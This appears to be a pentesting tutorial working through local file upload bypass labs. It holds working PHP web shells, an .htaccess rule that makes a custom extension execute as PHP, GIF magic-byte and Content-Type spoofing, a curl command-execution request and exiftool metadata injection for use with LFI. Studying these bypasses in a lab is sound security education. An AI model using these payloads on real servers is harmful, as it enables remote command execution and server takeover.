File upload abuse is a type of attack that occurs when an attacker exploits vulnerabilities in web applications that allow users to upload files to the server. This type of attack is commonly referred to as a "*malicious file upload*" attack.

In a malicious file upload attack, an attacker uploads a malicious file to a web application, which is then stored on the server. If for example the attacker manages to upload a PHP file and the web server stores it, he could achieve remote command execution and take control of the server.

Attackers can also use "*file type spoofing*" techniques to trick a web application into accepting a malicious file as if it were a legitimate file.

Here we will explore some of the most commonly used techniques to exploit the file upload phase in web applications. We will learn how attackers can upload malicious content, as well as circumvent different restrictions implemented to do so.

# Example 1

For this example we will clone the following *Github* directory: [file_upload_vulnerability_scenarios](https://github.com/moeinfatehi/file_upload_vulnerability_scenarios).

----
> As a help, all scenarios provide a hint in their source code.
----

To start we will do a *docker-compose up -d* to perform the lab setup and access *localhost:9001*. We will leave **BurpSuite** open to check the requests:

```bash
burpsuite &> /dev/null & disown
```

## Upload 1

The web site specifies that we can only upload jpeg or gif images, but it does not imply that this is true. With **Wappalyzer** we can see that the web interprets *PHP* so we are going to create a script called *file.php* and we are going to try to upload it to the server:

```php
<?php
    system("whoami");
?>
```

The file could be uploaded and if we access the file from the browser we can see the requested command. We could also pass the commands by query with this other file:

```php
<?php
    system($_GET['cmd']);
?>
```

In this case there is no sanitization so we can upload any type of file.

## Upload 3

In this case when uploading the *file.php* it tells us that the allowed extensions are *.jpg*, *.jpeg*, *.bmp*, *.gif* and *.png*.

As there has not been any redirection or change in the page we could suspect that the validation is being done on the *client side*, in the browser.

If we examine the source code of the page we can see that in the *onsubmit* of the form the *Validate()* function is executed. As all this is on the client side we can delete this validation of the *onsubmit* and the web will let us upload the file.

*Client-side* validation is never a good idea.

## Upload 10

This time it tells us directly that uploading *.php files* is forbidden. If we try to upload the *file.php* we see that indeed we can not, and we see a small redirect on the page that could indicate that the validation this time is being done on the *server side*.

In this case the web is validating that files with the *.php* extension are not uploaded but we can find an alternative listing for various file types on the [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload) page.

The trick is to modify the extension of *file.php* in **BurpSuite** and try to see which one you can upload: *.php2*, *.php3*, *.php4*, etc...

----
> Caution: The fact that it allows us to upload, for example, a file with extension .php3 does not mean that the server will interpret it, we must test which extension allows us to upload the file and also that the server interprets it.
----

In this case if we name our file as *file.php5* it lets us upload it and the server interprets it.

It is not a good way to sanitize the code by saying that you can not upload files ending in a certain extension.

## Upload 11

In this case the validation is the same as the previous one, but instead of checking only the *.php* extension, it also checks other alternatives to it.

The trick remains the same, keep checking what type of extension allows us to upload and which one the server interprets. In this case, it has been *file.pht*.

## Upload 12

In this case it will not interpret any alternative *.php* extension.

We can define a new policy by uploading an *.htaccess* file to allow the server to interpret custom extensions as existing extensions. In this case we could upload this *.htaccess*:

```bash
# Say all file with extension .loki will execute PHP
AddType application/x-httpd-php .loki
```

If it allows us to upload this file, we can upload our *file.php* renamed to *file.loki* and the server will interpret it as *PHP*.

The way to control this would be to prevent the user from uploading an *.htaccess* file.

## Upload 16

Here it is sanitized by *file size*. This is done to avoid one-liner files (like those generated by **Metasploit**) or very large suspicious files.

If we try to upload the file *file.php* it tells us that it is too big.

When passing the request through **Burpsuite** we see that we can actually control the *MAX_FILE_SIZE* so by expanding it we can upload it.

## Upload 17

In this case we are also limited by *file size* but it indicates that extra security has been applied.

Actually it also allows us to modify the *MAX_FILE_SIZE* parameter and then upload the file, but let's suppose that this is not possible and we have to look for another alternative.

A valid option would be to *reduce* to the maximum the *length of the code*:

```php
# This is the original code, the 0 does not need quotation marks as it is a number and could be accessed in the url as ?0=whoami
<?php system($_GET[0]); ?>

# This is the same but reduced
<?=`$_GET[0]`?>
```

In the latter case, it would let us upload the file.

## Upload 21

Now the restriction lies in the *file type*.

When we upload a file, the *first bytes* of the file (*Magic Numbers*) indicate the type it is, and it is with what many times they validate the files that we can upload and those that we cannot, in this case from **BurpSuite** we can see the *Content-Type: application/x-php* when we try to upload the file.php.

If we replace this *Content-Type* with *Content-Type: image/jpg* it will let us upload it.

*Content-Type* validation is fine but in sync with other validation types.

## Upload 23

In this case we have the restriction that we can only upload *.gif* files.

When we try to upload the file it is not intercepted by **BurpSuite** which means that there is the same validation on the *client side* as in *Upload 3*, so we remove the *onsubmit* from the code again.

Then we will find the same problem as in *Upload 21* and is that we must modify the *Content-Type* to have value *image/gif*.

Finally we will modify the *file.php* including the following:

```php
GIF8;

<?php
    system($_GET['cmd']);
?>
```

This is usually the first bytes of *.gif* files (*Magic Numbers*) so the file is detected as if it were a *GIF*.

Many web services base the detection of files on their first bytes.

## Upload 31

In this case we can only upload *.jpeg* and *.gif* files.

When we try to upload the *file.php* it tells us that it has been uploaded correctly and shows us a *successful GIF*.

If we try to find the file we realize that it does not exist, this is probably because they must have made some kind of treatment and no longer has that name.

If we look at the source code of the *successful GIF* we see that it has a name with a length of *32 characters*, this is usually *MD5* so maybe the uploaded files are being transformed into *MD5* to prevent the attacker from knowing the filename. Let's try to convert the name of our file to *MD5*:

```bash
echo -n "file" | md5sum
```

If we concatenate the resulting hash to the *.php* extension and search for it on the server this time we will find it.

## Upload 33

As in *Upload 31*, here we can also upload only *.jpeg* and *.gif* files.

The case is exactly the same as above only this time we must obtain the *MD5* hash of the entire string and then concatenate it to the *.php* extension:

```bash
echo -n "file.php" | md5sum
```

## Upload 35

As in the previous cases, here we can also upload only *.jpeg* and *.gif* files.

The difference with the previous exercises is that, in this case, the *successful GIF* has a length of *40 characters*, so we believe that this time it is *SHA1* hashed. We can try the two options we have seen in the two previous exercises to guess the file name:

```bash
echo -n "file" | sha1sum
echo -n "file.php" | sha1sum
```

None of these options work, but we can try hashing the contents of the file this time, which is the solution:

```bash
sha1sum file.php
```

----
> In the latter cases we should look at the *length* of the string and imagine a *hash* whose typical length is the same.
----

## Upload 41

As in the previous cases, here we can also upload only *.jpeg* and *.gif* files.

In this case the file is uploaded but it does not tell us where it is and there is no clue as to where it might be. In these cases you can use *brute force* to find that directory:

```bash
gobuster dir -u http://localhost:9001/upload41/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

After the scan we found the *images* directory, which is where our *file.php* has been uploaded.

## Upload 51

In this case it only allows us to upload *.jpg* files.

When we try to test all the bypass measures we have seen we see that none of them is effective.

Some developers check that the filename *contains the extension .jpg* (not *ending in .jpg*) using a *regex* so we can make a *double extension attack*: *file.jpg.php*.

## Upload 56

In this case it tells us to enter a name and it will allow us to upload the file, but when we access the path it only lets us download it, we can make the request from **curl** so that it does not download it:

```bash
# With -G we can indicate that we want to concatenate a url-encoded data with cmd and the parameter
curl -X GET "http://localhost:9001/upload56/loki/file.php" -G --data-urlencode "cmd=pwd"
```

## Upload 58

In this case it tells us to enter a name and when uploading the *file.php* it will tell us that we cannot upload *executable files*.

If we try again to upload a *.htaccess* it will give it for good and will let us upload it. Even then it will not let us upload our file with the *.loki* extension.

We can try changing the *Content-Type* to *image/jpg*, but that won't work either.

It could be the *Magic Numbers* so we tried to add *GIF8;* to the top line of the code; and now it lets us upload it and see it.

# Example 2

If for example we have the possibility to exploit an [[Local File Inclusion (LFI)]] and we can upload an image, we could use the **exiftool** tool to put a new *metadata* in the image with a command, so that when reading the *GIF* through the [[Local File Inclusion (LFI)]] it executes the command:

```bash
# With this we can insert new metadata into the image
exiftool -Comment='<?php system("whoami"); ?>' sample.gif

# With this we can read the image metadata
exiftools sample.gif
```